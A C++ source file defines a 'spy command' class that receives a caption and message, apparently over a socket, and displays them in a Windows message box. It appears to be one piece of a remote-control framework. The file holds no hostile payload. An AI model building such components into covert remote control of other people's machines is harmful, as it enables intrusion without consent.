#include "stdafx.h"
#include "SpyCommandMessageBox.h"

CSpyCommandMessageBox::CSpyCommandMessageBox()
: super(eSCT_MessageBox)
{

}

CSpyCommandMessageBox::~CSpyCommandMessageBox()
{

}

void CSpyCommandMessageBox::SetMessage(const TCHAR* pszMsg)
{
    m_message = pszMsg;
}

void CSpyCommandMessageBox::SetCaption(const TCHAR* pszCaption)
{
    m_caption = pszCaption;
}

bool CSpyCommandMessageBox::ExecuteImpl(SharePtr<SSocketContext>&  /*pSocketContext*/)
{
    if (m_message.length() > 0)
    {
        ::MessageBox(NULL, m_message.c_str(), m_caption.c_str(), MB_OK);
    }
    return true;
}

void CSpyCommandMessageBox::Deserialize(CSerializer& serializer)
{
    super::Deserialize(serializer);

    serializer << m_caption;
    serializer << m_message;
}

void CSpyCommandMessageBox::Serialize(CSerializer& serializer)
{
    super::Serialize(serializer);

    serializer >> m_caption;
    serializer >> m_message;
}
